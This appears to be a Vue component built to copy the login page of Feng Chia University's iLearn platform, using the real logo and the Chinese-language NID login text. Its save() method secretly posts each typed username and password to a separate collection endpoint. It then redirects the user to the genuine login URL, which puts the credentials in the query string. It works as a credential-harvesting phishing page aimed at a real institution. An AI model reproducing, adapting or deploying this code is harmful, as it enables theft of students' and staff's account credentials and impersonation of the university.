<script lang="ts">
import { Component, Vue, Ref } from "vue-facing-decorator";
import axios from "axios";

@Component
export default class LoginForm extends Vue {
  @Ref("username") readonly username!: HTMLInputElement;
  @Ref("password") readonly password!: HTMLInputElement;

  save(): void {
    const username = this.username.value,
      password = this.password.value;

    axios.post("http://localhost:3000/create-entry", {
      username: username,
      password: password,
    });

    window.location.href = `https://ilearn.fcu.edu.tw/login/index.php?username=${username}&password=${password}`;
  }
}
</script>

<template>
  <div id="center-box">
    <div id="inner-box">
      <div id="login-form">
        <img
          src="https://ilearn.fcu.edu.tw/pluginfile.php/1/theme_moove/logo/1711685263/moodle4_log.jpg"
        />
        <input
          class="form-input"
          id="username-input"
          ref="username"
          placeholder="帳號"
          v-on:keyup.enter="save()"
        />
        <input
          class="form-input"
          id="password-input"
          ref="password"
          type="password"
          placeholder="密碼"
          v-on:keyup.enter="save()"
        />
        <button id="login" @click.prevent="save()">登入</button>
      </div>
      <div id="bar"></div>
      <div id="info">
        <p><strong>請使用NID帳號/密碼登入平台。</strong></p>
        <p>
          <strong
            >欲變更NID密碼，請連結至<a href="https://netid.fcu.edu.tw/"
              ><img src="https://netid.fcu.edu.tw/image/nidlogo.png" /></a
          ></strong>
        </p>
        <div id="info-box">
          <select required>
            <option>正體中文 (zh_tw)</option>
            <option>English (en)</option>
          </select>
          &nbsp;&nbsp;&nbsp;&nbsp;
          <p id="cookie-info">ⓘCookie使用資訊</p>
        </div>
      </div>
    </div>
  </div>
</template>

<style scoped>
#center-box {
  gap: 0.1rem;

  box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
  height: fit-content;
  width: 60%;
  background-color: white;
  border-radius: 0.5rem;

  margin: auto;
  position: absolute;
  top: 0;
  bottom: 0;
  left: 0;
  right: 0;

  padding: 2rem;
}

#inner-box {
  display: inline-flex;
  flex: 0 0 50%;
  padding: 2rem;
}

#login-form {
  padding-right: 2rem;
  width: 50%;
}

#login-form > * {
  margin: 10px auto;
}

#login {
  border: none;
  width: 100%;
  height: 15%;
  border-radius: 8px;
  cursor: pointer;
  color: white;
  font-size: large;
  background-color: firebrick;
  transition: all 0.5s ease-in-out;
}

#login:hover {
  background-color: darkred;
  transition: all 0.5s ease-in-out;
}

#bar {
  width: 1px;
  background-color: lightgray;
}

#info {
  margin: auto auto;
  padding-left: 2rem;
  width: 50%;
  text-align: center;
  font-size: large;
}

.form-input {
  height: calc(1.5em + 1rem + 2px);
  padding: 0.5rem 1rem;
  display: block;
  border-radius: 0.6rem;
  width: 90%;
}

img {
  vertical-align: middle;
  border-style: none;
  max-width: 100%;
  max-height: 100%;
}

#info-box {
  display: inline-flex;
  flex: 0 0 auto;
  font-size: large;
  color: firebrick;
}

#cookie-info {
  cursor: pointer;
}

select {
  font-size: large;
  color: firebrick;
}

select option {
  font-size: large;
  color: firebrick;
}

select {
  border: 0px;
  outline: 0px;
}

input {
  border-style: solid;
  border-width: 1px;
  font-size: larger;
}
</style>
